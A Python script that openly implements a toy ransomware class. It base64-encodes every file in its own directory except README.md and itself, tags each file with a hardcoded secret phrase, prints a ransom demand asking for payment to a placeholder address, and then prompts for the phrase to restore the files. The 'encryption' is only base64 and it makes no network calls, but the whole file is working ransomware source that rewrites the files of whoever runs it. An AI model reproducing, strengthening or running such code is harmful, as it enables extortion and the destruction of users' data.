import logging
import os
import sys
import base64

class Ransomware:
    def __init__(self, name, secret_phrase):
        self._name = name
        self._secret_phrase = secret_phrase

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def secret_phrase(self):
        return self._secret_phrase

    @secret_phrase.setter
    def secret_phrase(self, new_phrase):
        self._secret_phrase = new_phrase

    def ransom_user(self):
        print(
            "Hi, all your files have been encrypted. To decrypt them, "
            "please send 0.1 USD to the following address: XYZ. "
            "After payment, use the secret phrase provided to unlock your files."
        )

    def encrypt_file(self, filename):
        with open(filename, 'r') as file:
            content = file.read()
        encrypted_data = base64.b64encode(content.encode('utf-8')).decode('utf-8')

        # Append the secret phrase at the end of the file as a simple marker (for demonstration).
        encrypted_data += f"\nSECRET:{self._secret_phrase}"

        with open(filename, 'w') as file:
            file.write(encrypted_data)

    def decrypt_file(self, phrase, filename):
        with open(filename, 'r') as file:
            content = file.read()

        # Verify the secret phrase is present in the file.
        if f"SECRET:{phrase}" not in content:
            print(f"Incorrect secret phrase for file: {filename}")
            return

        # Remove the secret phrase marker and decode the data.
        encrypted_data = content.replace(f"\nSECRET:{phrase}", "")
        decrypted_data = base64.b64decode(encrypted_data.encode('utf-8')).decode('utf-8')

        with open(filename, 'w') as file:
            file.write(decrypted_data)

    def get_files_in_folder(self, path):
        files = []
        for file in os.listdir(path):
            if file == 'README.md' or file == sys.argv[0]:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files

    def encrypt_files_in_folder(self, path):
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        for file in files:
            logging.debug('Encrypting file: {}'.format(file))
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        phrase = input("Please enter the secret phrase to decrypt your files: ")

        if phrase != self.secret_phrase:
            print("Wrong secret phrase! Decryption failed.")
            return

        files = self.get_files_in_folder(path)

        for file in files:
            self.decrypt_file(phrase, file)

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Initialize ransomware with a secret phrase.
    secret_phrase = "banana"  # This is the phrase that the victim must know.
    ransomware = Ransomware('EnhancedRansomware', secret_phrase)

    path = os.path.dirname(os.path.abspath(__file__))

    # Encrypt files in the current directory.
    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    # Attempt to decrypt files.
    ransomware.decrypt_files_in_folder(path)
